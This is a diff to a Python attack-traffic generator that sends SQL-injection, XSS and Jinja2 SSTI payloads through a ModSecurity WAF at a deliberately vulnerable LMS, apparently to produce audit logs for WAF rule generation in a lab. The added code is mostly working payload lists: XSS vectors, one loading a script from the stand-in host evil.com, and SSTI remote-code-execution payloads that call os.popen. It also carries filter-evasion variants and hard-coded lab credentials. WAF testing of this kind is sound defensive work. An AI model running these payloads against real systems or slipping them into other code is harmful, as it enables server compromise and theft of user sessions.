@@ -2,8 +2,8 @@
 """
 attackScript.py
 ===============
-Generate SQL-injection attack traffic against the vulnerable LMS target
-*through the XAF WAF*, so that ModSecurity writes real entries into
+Generate SQL-injection, XSS and SSTI attack traffic against the vulnerable LMS
+target *through the XAF WAF*, so that ModSecurity writes real entries into
 modsec-logs/audit.log. Those entries are the input for the parsing /
 clustering / rule-generation pipeline.
 
@@ -11,9 +11,14 @@ Lab use only. By default this targets your own WAF on http://localhost:8080.
 Sending traffic to :5000 would hit the LMS directly and bypass the WAF
 (nothing would be logged by ModSecurity), so keep the target on the proxy port.
 
-LMS SQLi sinks:
-  POST /login       — form fields: username, password
-  GET  /courses?q=  — query param: q  (WAF inspects even without a session)
+Attack sinks:
+  POST /login          — SQLi via form fields: username, password
+  GET  /courses?q=     — SQLi via query param q (WAF inspects even without a session)
+  GET  /xss-search?q=  — reflected XSS via unescaped query param
+  POST /feedback       — SSTI via Jinja2 render_template_string(user_input)
+
+The XSS and SSTI endpoints are authenticated, so the script logs in first and
+reuses the session cookie for every request.
 
 Requires only the Python 3 standard library.
 
@@ -21,9 +26,12 @@ Usage
 -----
     python3 attackScript.py
     python3 attackScript.py --url http://localhost:8080 --rounds 5 --delay 0.3
-    python3 attackScript.py --no-benign        # attacks only
+    python3 attackScript.py --no-benign               # attacks only
     python3 attackScript.py --rounds 10 --delay 0.1   # more volume, faster
-    python3 attackScript.py --bypasses-only    # only payloads that evade the traditional WAF
+    python3 attackScript.py --type sqli               # SQLi payloads only
+    python3 attackScript.py --type xss                # XSS payloads only
+    python3 attackScript.py --type ssti               # SSTI payloads only
+    python3 attackScript.py --bypasses-only           # only payloads that evade the traditional WAF
 
 After it runs, check the log:
     tail -n 20 ~/Desktop/XAF/modsec-logs/audit.log
@@ -38,6 +46,12 @@ import urllib.error
 import urllib.parse
 import urllib.request
 from collections import Counter
+
+# ---------------------------------------------------------------------------
+# Credentials to obtain a session cookie (needed for authenticated endpoints)
+# ---------------------------------------------------------------------------
+LOGIN_USER = "student1"
+LOGIN_PASS = "pass123"
 
 # ---------------------------------------------------------------------------
 # Payload sets, grouped by family.
@@ -103,8 +117,80 @@ BYPASS_PAYLOADS = {
     ],
 }
 
+XSS_PAYLOADS = {
+    "script_tag": [
+        "<script>alert(1)</script>",
+        "<script>alert(document.cookie)</script>",
+        "<SCRIPT>alert('xss')</SCRIPT>",
+        "<script src=//evil.com/x.js></script>",
+    ],
+    "event_handler": [
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<body onload=alert(1)>",
+        "<input autofocus onfocus=alert(1)>",
+        "<video src=x onerror=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+    ],
+    "javascript_uri": [
+        "<a href=javascript:alert(1)>click</a>",
+        "<iframe src=javascript:alert(1)>",
+        "javascript:alert(document.domain)",
+    ],
+    "encoded": [
+        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "&#60;script&#62;alert(1)&#60;/script&#62;",
+        "<scr\x00ipt>alert(1)</scr\x00ipt>",
+        "<img src=x o\x00nerror=alert(1)>",
+    ],
+    "obfuscated": [
+        "<ScRiPt>alert(1)</sCrIpT>",
+        "<svg/onload=alert(1)>",
+        "<<script>alert(1)//<</script>",
+        "<img src=\"x\" onerror=\"alert(1)\">",
+        "'><script>alert(String.fromCharCode(88,83,83))</script>",
+    ],
+}
+
+SSTI_PAYLOADS = {
+    "probe": [
+        "{{7*7}}",
+        "{{7*'7'}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "#{7*7}",
+    ],
+    "info_leak": [
+        "{{config}}",
+        "{{config.items()}}",
+        "{{request.environ}}",
+        "{{self.__dict__}}",
+        "{{g}}",
+    ],
+    "class_traversal": [
+        "{{''.__class__.__mro__}}",
+        "{{''.__class__.__mro__[1].__subclasses__()}}",
+        "{{().__class__.__bases__[0].__subclasses__()}}",
+        "{{[].__class__.__mro__[-1].__subclasses__()}}",
+    ],
+    "rce": [
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
+        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
+    ],
+    "obfuscated": [
+        "{{''.join(['_','_','c','l','a','s','s','_','_'])}}",
+        "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}",
+        "{%set x='__cla'+'ss__'%}{{''|attr(x)}}",
+        "{{lipsum.__globals__.os.popen('id').read()}}",
+    ],
+}
+
 # Benign baseline — these should mostly NOT be blocked (false-positive check).
-BENIGN_PAYLOADS = [
+# SQLi endpoints (login / courses) take short keyword-style input; the XSS/SSTI
+# endpoints (search / feedback) take more natural-language input.
+BENIGN_SQLI = [
     "python",
     "data science",
     "networking",
@@ -114,14 +200,56 @@ BENIGN_PAYLOADS = [
     "1",
 ]
 
+BENIGN_XSS = [
+    "python programming",
+    "database systems",
+    "great course, very helpful!",
+    "I enjoyed the lab sessions.",
+    "please add more exercises",
+    "hello world",
+    "networking fundamentals",
+]
 
-def do_request(url, data=None, headers=None, timeout=10):
-    """Send one request and return the HTTP status code (or an ERR string)."""
-    method = "POST" if data is not None else "GET"
-    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
-    req.add_header("User-Agent", "xaf-attack-sim/1.0")
+
+# ---------------------------------------------------------------------------
+# HTTP helpers
+# ---------------------------------------------------------------------------
+def make_opener():
+    """Return an opener that follows redirects and stores cookies."""
+    jar = urllib.request.HTTPCookieProcessor()
+    return urllib.request.build_opener(jar)
+
+
+def do_login(opener, base):
+    """Authenticate through the WAF and store the session cookie in opener."""
+    body = urllib.parse.urlencode({"username": LOGIN_USER, "password": LOGIN_PASS}).encode()
+    req = urllib.request.Request(
+        f"{base}/login",
+        data=body,
+        headers={"Content-Type": "application/x-www-form-urlencoded",
+                 "User-Agent": "xaf-attack-sim/2.0"},
+        method="POST",
+    )
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as resp:
+        with opener.open(req, timeout=10):
+            pass
+        return True
+    except Exception as exc:
+        print(f"[!] Login failed: {exc}")
+        return False
+
+
+def do_request(opener, url, data=None):
+    """Send one request through the session opener; return the HTTP status code."""
+    method = "POST" if data is not None else "GET"
+    req = urllib.request.Request(
+        url, data=data,
+        headers={"Content-Type": "application/x-www-form-urlencoded",
+                 "User-Agent": "xaf-attack-sim/2.0"},
+        method=method,
+    )
+    try:
+        with opener.open(req, timeout=10) as resp:
             return resp.status
     except urllib.error.HTTPError as e:
         return e.code
@@ -129,78 +257,135 @@ def do_request(url, data=None, headers=None, timeout=10):
         return f"ERR:{e.reason}"
 
 
-def attack_login_username(base, payload):
+# ---------------------------------------------------------------------------
+# Attack functions — SQLi
+# ---------------------------------------------------------------------------
+def attack_login_username(opener, base, payload):
     """POST /login — inject into the username field."""
     body = urllib.parse.urlencode({"username": payload, "password": "wrongpass"}).encode()
-    return do_request(
-        f"{base}/login",
-        data=body,
-        headers={"Content-Type": "application/x-www-form-urlencoded"},
-    )
+    return do_request(opener, f"{base}/login", data=body)
 
 
-def attack_login_password(base, payload):
+def attack_login_password(opener, base, payload):
     """POST /login — inject into the password field."""
     body = urllib.parse.urlencode({"username": "admin", "password": payload}).encode()
-    return do_request(
-        f"{base}/login",
-        data=body,
-        headers={"Content-Type": "application/x-www-form-urlencoded"},
-    )
+    return do_request(opener, f"{base}/login", data=body)
 
 
-def attack_courses_search(base, payload):
+def attack_courses_search(opener, base, payload):
     """GET /courses?q= — inject into the course search parameter."""
     qs = urllib.parse.urlencode({"q": payload})
-    return do_request(f"{base}/courses?{qs}")
+    return do_request(opener, f"{base}/courses?{qs}")
 
 
-def attack_benign_login(base, payload):
+# ---------------------------------------------------------------------------
+# Attack functions — XSS / SSTI
+# ---------------------------------------------------------------------------
+def attack_xss_search(opener, base, payload):
+    """GET /xss-search?q=<payload>"""
+    qs = urllib.parse.urlencode({"q": payload})
+    return do_request(opener, f"{base}/xss-search?{qs}")
+
+
+def attack_ssti_feedback(opener, base, payload):
+    """POST /feedback with message=<payload>"""
+    body = urllib.parse.urlencode({"message": payload}).encode()
+    return do_request(opener, f"{base}/feedback", data=body)
+
+
+# ---------------------------------------------------------------------------
+# Benign baselines
+# ---------------------------------------------------------------------------
+def attack_benign_login(opener, base, payload):
     """POST /login with a benign username (false-positive baseline)."""
     body = urllib.parse.urlencode({"username": payload, "password": "wrongpass"}).encode()
-    return do_request(
-        f"{base}/login",
-        data=body,
-        headers={"Content-Type": "application/x-www-form-urlencoded"},
-    )
+    return do_request(opener, f"{base}/login", data=body)
 
 
-def build_tasks(include_benign):
-    """Return a list of (family, vector, payload, callable) tasks."""
+def attack_benign_courses(opener, base, payload):
+    """GET /courses?q=<benign> — false-positive baseline."""
+    qs = urllib.parse.urlencode({"q": payload})
+    return do_request(opener, f"{base}/courses?{qs}")
+
+
+def attack_benign_search(opener, base, payload):
+    """GET /xss-search?q=<benign> — false-positive baseline."""
+    qs = urllib.parse.urlencode({"q": payload})
+    return do_request(opener, f"{base}/xss-search?{qs}")
+
+
+def attack_benign_feedback(opener, base, payload):
+    """POST /feedback with benign message — false-positive baseline."""
+    body = urllib.parse.urlencode({"message": payload}).encode()
+    return do_request(opener, f"{base}/feedback", data=body)
+
+
+# ---------------------------------------------------------------------------
+# Task builders — each task is (attack_type, family, vector, payload, callable)
+# ---------------------------------------------------------------------------
+def build_tasks(attack_type, include_benign):
     tasks = []
-    for family, payloads in SQLI_PAYLOADS.items():
-        for p in payloads:
-            tasks.append((family, "login_username", p,
-                          lambda base, p=p: attack_login_username(base, p)))
-            tasks.append((family, "login_password", p,
-                          lambda base, p=p: attack_login_password(base, p)))
-            tasks.append((family, "courses_q", p,
-                          lambda base, p=p: attack_courses_search(base, p)))
+
+    if attack_type in ("sqli", "all"):
+        for family, payloads in SQLI_PAYLOADS.items():
+            for p in payloads:
+                tasks.append(("sqli", family, "login_username", p,
+                              lambda op, base, p=p: attack_login_username(op, base, p)))
+                tasks.append(("sqli", family, "login_password", p,
+                              lambda op, base, p=p: attack_login_password(op, base, p)))
+                tasks.append(("sqli", family, "courses_q", p,
+                              lambda op, base, p=p: attack_courses_search(op, base, p)))
+
+    if attack_type in ("xss", "all"):
+        for family, payloads in XSS_PAYLOADS.items():
+            for p in payloads:
+                tasks.append(("xss", family, "xss_search", p,
+                              lambda op, base, p=p: attack_xss_search(op, base, p)))
+
+    if attack_type in ("ssti", "all"):
+        for family, payloads in SSTI_PAYLOADS.items():
+            for p in payloads:
+                tasks.append(("ssti", family, "feedback", p,
+                              lambda op, base, p=p: attack_ssti_feedback(op, base, p)))
+
     if include_benign:
-        for p in BENIGN_PAYLOADS:
-            tasks.append(("benign", "login_username", p,
-                          lambda base, p=p: attack_benign_login(base, p)))
-            tasks.append(("benign", "courses_q", p,
-                          lambda base, p=p: attack_courses_search(base, p)))
+        if attack_type in ("sqli", "all"):
+            for p in BENIGN_SQLI:
+                tasks.append(("benign", "benign", "login_username", p,
+                              lambda op, base, p=p: attack_benign_login(op, base, p)))
+                tasks.append(("benign", "benign", "courses_q", p,
+                              lambda op, base, p=p: attack_benign_courses(op, base, p)))
+        if attack_type in ("xss", "ssti", "all"):
+            for p in BENIGN_XSS:
+                tasks.append(("benign", "benign", "xss_search", p,
+                              lambda op, base, p=p: attack_benign_search(op, base, p)))
+                tasks.append(("benign", "benign", "feedback", p,
+                              lambda op, base, p=p: attack_benign_feedback(op, base, p)))
+
     return tasks
 
 
 def build_bypass_tasks():
-    """Return tasks for only the payloads that evade the traditional CRS WAF."""
+    """Return SQLi tasks for only the payloads that evade the traditional CRS WAF."""
     tasks = []
     for family, payloads in BYPASS_PAYLOADS.items():
         for p in payloads:
-            tasks.append((family, "login_username", p,
-                          lambda base, p=p: attack_login_username(base, p)))
-            tasks.append((family, "login_password", p,
-                          lambda base, p=p: attack_login_password(base, p)))
-            tasks.append((family, "courses_q", p,
-                          lambda base, p=p: attack_courses_search(base, p)))
+            tasks.append(("sqli", family, "login_username", p,
+                          lambda op, base, p=p: attack_login_username(op, base, p)))
+            tasks.append(("sqli", family, "login_password", p,
+                          lambda op, base, p=p: attack_login_password(op, base, p)))
+            tasks.append(("sqli", family, "courses_q", p,
+                          lambda op, base, p=p: attack_courses_search(op, base, p)))
     return tasks
 
 
+# ---------------------------------------------------------------------------
+# Main
+# ---------------------------------------------------------------------------
 def main():
-    ap = argparse.ArgumentParser(description="SQLi attack-traffic generator for the XAF WAF lab.")
+    ap = argparse.ArgumentParser(
+        description="SQLi + XSS + SSTI attack-traffic generator for the XAF WAF lab."
+    )
     ap.add_argument("--url", default="http://localhost:8080",
                     help="Base URL of the WAF proxy (default: http://localhost:8080)")
     ap.add_argument("--rounds", type=int, default=3,
@@ -209,8 +394,10 @@ def main():
                     help="Seconds to wait between requests (default: 0.25)")
     ap.add_argument("--no-benign", action="store_true",
                     help="Send attack payloads only, skip benign baseline traffic")
+    ap.add_argument("--type", choices=["sqli", "xss", "ssti", "all"], default="all",
+                    help="Which attack type to send (default: all)")
     ap.add_argument("--bypasses-only", action="store_true",
-                    help="Send only payloads that evade the traditional CRS WAF (adaptive WAF demo)")
+                    help="Send only SQLi payloads that evade the traditional CRS WAF (adaptive WAF demo)")
     args = ap.parse_args()
 
     base = args.url.rstrip("/")
@@ -220,11 +407,27 @@ def main():
 
     if args.bypasses_only:
         tasks = build_bypass_tasks()
-        print("Mode            : bypasses-only (payloads that evade the traditional CRS WAF)")
+        attack_type = "sqli"
+        print("Mode            : bypasses-only (SQLi payloads that evade the traditional CRS WAF)")
     else:
-        tasks = build_tasks(include_benign=not args.no_benign)
+        attack_type = args.type
+        tasks = build_tasks(attack_type, include_benign=not args.no_benign)
+
+    opener = make_opener()
+    print(f"Logging in as {LOGIN_USER} through {base} ...", end=" ")
+    if do_login(opener, base):
+        print("OK\n")
+    else:
+        # The XSS/SSTI sinks need a session; SQLi sinks do not. Only abort when an
+        # authenticated attack type is actually part of this run.
+        if attack_type in ("xss", "ssti", "all"):
+            print("Aborting (XSS/SSTI endpoints require a session).")
+            sys.exit(1)
+        print("Continuing without a session (SQLi sinks don't need one).\n")
+
     total = len(tasks) * args.rounds
     print(f"Target          : {base}")
+    print(f"Attack type     : {attack_type}")
     print(f"Payload tasks   : {len(tasks)} per round")
     print(f"Rounds          : {args.rounds}")
     print(f"Total requests  : {total}")
@@ -238,17 +441,18 @@ def main():
     try:
         for r in range(1, args.rounds + 1):
             random.shuffle(tasks)
-            for family, vector, payload, fn in tasks:
-                code = fn(base)
+            for atype, family, vector, payload, fn in tasks:
+                code = fn(opener, base)
                 status_counts[code] += 1
-                family_total[family] += 1
+                key = f"{atype}/{family}"
+                family_total[key] += 1
                 if code == 403:
-                    family_blocked[family] += 1
+                    family_blocked[key] += 1
                 sent += 1
 
                 blocked = "BLOCKED" if code == 403 else f"code={code}"
                 short = (payload[:42] + "…") if len(payload) > 43 else payload
-                print(f"[r{r}] {family:<13} {vector:<16} {blocked:<10} {short}")
+                print(f"[r{r}] {atype:<6} {family:<18} {vector:<16} {blocked:<10} {short}")
                 time.sleep(args.delay)
     except KeyboardInterrupt:
         print("\nInterrupted — printing partial summary.\n")
@@ -257,21 +461,17 @@ def main():
     print("SUMMARY")
     print("=" * 60)
     print(f"Requests sent : {sent}")
+
     print("\nBy status code:")
     for code, n in sorted(status_counts.items(), key=lambda kv: str(kv[0])):
         print(f"  {str(code):<10} {n}")
 
     print("\nBlock rate by family (403 / total):")
-    if args.bypasses_only:
-        families = list(BYPASS_PAYLOADS.keys())
-    else:
-        families = list(SQLI_PAYLOADS.keys()) + (["benign"] if not args.no_benign else [])
-    for family in families:
-        t = family_total.get(family, 0)
-        b = family_blocked.get(family, 0)
-        if t:
-            pct = (b / t) * 100
-            print(f"  {family:<13} {b:>4}/{t:<4} ({pct:5.1f}%)")
+    for key in sorted(family_total):
+        t = family_total[key]
+        b = family_blocked.get(key, 0)
+        pct = (b / t) * 100
+        print(f"  {key:<28} {b:>4}/{t:<4} ({pct:5.1f}%)")
 
     print("\nNow inspect the audit log the WAF just wrote:")
     print("  tail -n 20 ~/Desktop/XAF/modsec-logs/audit.log")
